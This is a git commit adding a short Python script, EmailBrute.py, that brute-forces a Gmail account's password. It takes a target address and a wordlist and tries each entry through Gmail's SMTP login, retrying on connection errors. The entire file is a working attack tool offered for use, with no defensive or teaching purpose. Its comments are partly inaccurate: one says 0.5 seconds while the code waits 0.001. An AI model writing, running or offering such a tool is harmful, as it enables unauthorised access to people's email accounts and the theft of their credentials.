b4f47f812676b78257263d3a8891d9e7bdd1d2b4
Lukman <33451113+LookyP@users.noreply.github.com>
2017-11-08 18:04:11 +0000

    Add files via upload
    Changed a bit of the code, caught more errors and labelled a few more things

---
+++ EmailBrute.py
@@ -0,0 +1,39 @@
+import smtplib #the SMTP library required for the connection
+import time #time import
+global emailUser
+
+global emailPass
+global filePass
+
+def serve():
+    global server
+    server = smtplib.SMTP("smtp.gmail.com", 587) #connects to the SMTP server with the port
+    server.ehlo()#lets the server know that you're there
+    server.starttls()#starts a connection with the server
+serve()
+emailUser = input("Enter an email address you wish to try to break: ")#username
+emailPass = input("Enter a text file for brute force: ")#passfile for brute force
+filePass = open(emailPass, 'r')#loads the specified file
+
+def hack():
+    for password in filePass:#for each password in the file...
+        try:
+            server.login(emailUser,password)#try to login with the user and pass
+            print("+   Password found   + : ", password)#if password found
+            break#exit loop
+
+        except smtplib.SMTPAuthenticationError:#catch error, password wrong
+            print("-   Password incorrect   - : ", password)#if incorrect password
+            time.sleep(0.001)#wait 0.5 seconds between each try
+        except smtplib.SMTPConnectError:
+            time.sleep(5)
+            hack()
+        except smtplib.SMTPDataError:
+            time.sleep(5)
+            hack()
+        except smtplib.SMTPServerDisconnected:
+            time.sleep(5)
+            serve()
+            hack()
+
+hack()
